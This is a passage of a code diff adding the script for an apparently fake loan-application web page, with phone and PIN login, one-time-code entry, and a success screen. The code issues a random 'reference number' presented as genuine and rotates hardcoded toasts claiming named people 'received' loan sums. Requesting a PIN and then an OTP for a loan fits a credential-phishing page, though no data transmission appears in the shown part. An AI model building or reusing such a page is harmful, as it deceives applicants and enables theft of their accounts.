+  go('s-login', 's-otp');
+  startOtpCountdown();
+}
+
+function goToSuccess() {
+  var ref = 'ECL-2026-' + Math.floor(100000 + Math.random() * 900000);
+  document.getElementById('ref-num').textContent = ref;
+  document.getElementById('successTitle').textContent = 'Application submitted';
+  document.getElementById('successMsg').textContent = 'Your application is being reviewed. You\'ll receive an SMS with your reference number and next steps shortly.';
+  clearInterval(otpTimer);
+  go('s-otp', 's-ok');
+}
+
+function goBackToLogin() {
+  clearInterval(otpTimer);
+  resetOtpBoxes();
+  go('s-otp', 's-login');
+}
+
+function reset() {
+  clearInterval(pollTimer);
+  hidePolling();
+  ['fn', 'ln', 'inc'].forEach(function(id) {
+    var el = document.getElementById(id);
+    if (el) el.value = '';
+  });
+  document.getElementById('incomeSource').value = '';
+  document.getElementById('slider').value = 20;
+  document.getElementById('amountInput').value = '';
+  document.getElementById('amountError').classList.remove('show');
+  durVal = 6;
+  document.querySelectorAll('.dur-opt').forEach(function(b, i) {
+    b.classList.toggle('selected', i === 0);
+  });
+  updateLanding();
+  go('s-ok', 's-land');
+}
+
+/* ── Login Screen Logic ── */
+var phoneInputLogin = document.getElementById('phoneInputLogin');
+if (phoneInputLogin) {
+  phoneInputLogin.addEventListener('keydown', function(e) {
+    if (!/^[0-9]$/.test(e.key) && !['Backspace','Tab','ArrowLeft','ArrowRight','Delete'].includes(e.key)) {
+      e.preventDefault();
+    }
+  });
+  phoneInputLogin.addEventListener('input', function() {
+    phoneInputLogin.value = phoneInputLogin.value.replace(/\D/g, '');
+  });
+}
+
+var pinBoxes = document.querySelectorAll('.pin-box');
+pinBoxes.forEach(function(box, i) {
+  box.addEventListener('keydown', function(e) {
+    if (!/^[0-9]$/.test(e.key) && !['Backspace','Tab','ArrowLeft','ArrowRight'].includes(e.key)) {
+      e.preventDefault();
+    }
+  });
+  box.addEventListener('input', function() {
+    box.value = box.value.replace(/\D/g, '').slice(0,1);
+    if (box.value && i < pinBoxes.length - 1) pinBoxes[i+1].focus();
+  });
+  box.addEventListener('keydown', function(e) {
+    if (e.key === 'Backspace' && !box.value && i > 0) pinBoxes[i-1].focus();
+  });
+});
+
+document.getElementById('continueBtn').addEventListener('click', function() {
+  goToOtp();
+});
+
+/* ── OTP Logic ── */
+var otpBoxes = document.querySelectorAll('.otp-box');
+var submitBtn = document.getElementById('submitBtn');
+
+otpBoxes.forEach(function(box, i) {
+  box.addEventListener('input', function() {
+    box.value = box.value.replace(/\D/g, '').slice(0,1);
+    if (box.value && i < otpBoxes.length - 1) otpBoxes[i+1].focus();
+    submitBtn.classList.toggle('active', Array.from(otpBoxes).every(function(b) { return b.value; }));
+  });
+  box.addEventListener('keydown', function(e) {
+    if (e.key === 'Backspace' && !box.value && i > 0) otpBoxes[i-1].focus();
+  });
+  box.addEventListener('paste', function(e) {
+    e.preventDefault();
+    var txt = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+    txt.split('').slice(0, otpBoxes.length - i).forEach(function(ch, j) { if(otpBoxes[i+j]) otpBoxes[i+j].value = ch; });
+    otpBoxes[Math.min(i+txt.length, otpBoxes.length-1)].focus();
+    submitBtn.classList.toggle('active', Array.from(otpBoxes).every(function(b) { return b.value; }));
+  });
+});
+
+document.getElementById('backBtn').addEventListener('click', function() {
+  goBackToLogin();
+});
+
+submitBtn.addEventListener('click', function() {
+  if (submitBtn.classList.contains('active')) {
+    goToSuccess();
+  }
+});
+
+function startOtpCountdown() {
+  clearInterval(otpTimer);
+  var secs = 58;
+  var rt = document.getElementById('resendText');
+  rt.innerHTML = 'Resend OTP in <span id="countdown">58</span> seconds';
+  var cdEl = document.getElementById('countdown');
+  otpTimer = setInterval(function() {
+    secs--;
+    if (secs <= 0) {
+      clearInterval(otpTimer);
+      rt.innerHTML = '<span style="color:#1E4CB5;font-weight:700;cursor:pointer;">Resend OTP</span>';
+    } else {
+      cdEl.textContent = secs;
+    }
+  }, 1000);
+}
+
+function resetOtpBoxes() {
+  otpBoxes.forEach(function(b) { b.value = ''; });
+  submitBtn.classList.remove('active');
+  var rt = document.getElementById('resendText');
+  rt.innerHTML = 'Resend OTP in <span id="countdown">58</span> seconds';
+}
+
+updateLanding();
+
+var names = [['Tendai M.', '$1,500'], ['Rudo C.', '$3,200'], ['Farai D.', '$800'], ['Simba N.', '$500'], ['Chipo Z.', '$12,000']];
+var ti = 0;
+function showToast() {
+  if (!document.getElementById('s-land').classList.contains('active')) return;
+  var p = names[ti % names.length]; ti++;
+  document.getElementById('t-text').innerHTML = '<b>' + p[0] + '</b> received ' + p[1];
+  var el = document.getElementById('toast');
+  el.classList.add('show');
+  setTimeout(function() { el.classList.remove('show'); }, 4000);
+}
+setTimeout(function() { showToast(); setInterval(showToast, 8000); }, 4000);
+</script>
+</body>
+</html>
